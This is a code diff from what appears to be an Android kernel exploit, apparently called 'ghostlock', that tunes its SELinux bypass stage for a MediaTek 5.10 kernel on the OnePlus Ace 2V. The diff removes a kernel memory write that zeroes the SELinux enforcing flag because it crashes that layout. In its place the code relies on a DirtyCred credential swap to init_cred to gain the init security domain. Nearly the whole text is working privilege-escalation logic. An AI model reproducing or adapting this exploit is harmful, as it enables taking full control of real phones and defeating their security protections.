@@ -385,38 +385,24 @@ namespace ghostlock::session::backend {
          * to read enforce while it is still enforcing, so attempt W1 regardless. */
             Status selinux_ok = attack::check_selinux_off();
             if (!selinux_ok) {
-                if (!attack::enforce_readable()) {
-                    pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
-                }
-                attack::timer_mark("pre-W1 drain");
-                uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
-                if constexpr (M::multicast) {
-                    /* a non-resident multicast write cannot safely retry a missed W1 */
-                    w1_attempts = 1;
-                }
-                support::run_state::enter("w1a");
-                selinux_ok = retry_write_stage<M>(
-                    session,
-                    "W1: SELinux",
-                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
-                    1, w1_attempts,
-                    g_exploit_session.profile.w1_settle_us(),
-                    victim::verify_selinux_stage, nullptr, 0);
-
-                if (!selinux_ok) {
-                    pr_warning("Write 1 failed\n");
-                    return StageResult::Failed;
-                }
+                /* MTK 5.10 (OnePlus Ace 2V) layout: the 8-byte W1 zero write
+                 * lands across selinux_state fields (initialized/enforcing) and
+                 * the policy pointer at +8, which panics the kernel. SELinux is
+                 * bypassed anyway by W2's DirtyCred swap: redirecting task->cred
+                 * to init_cred carries the init LSM blob, so the child runs in
+                 * the init domain without disabling enforcement. Skip W1 here. */
+                pr_warning("W1 skipped for MTK 5.10 layout (8-byte write corrupts "
+                           "selinux_state); relying on init_cred domain swap\n");
+                attack::timer_mark("Write 1 skipped");
                 support::run_state::complete("w1a");
                 support::run_state::enter("w1b");
                 if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
                 support::run_state::complete("w1b");
-                attack::timer_mark("Write 1 complete");
-            } else {
-                pr_success("SELinux already permissive\n");
-                support::run_state::complete("w1a");
-                support::run_state::complete("w1b");
+                return StageResult::Continue;
             }
+            pr_success("SELinux already permissive\n");
+            support::run_state::complete("w1a");
+            support::run_state::complete("w1b");
             return StageResult::Continue;
         }
     } // namespace
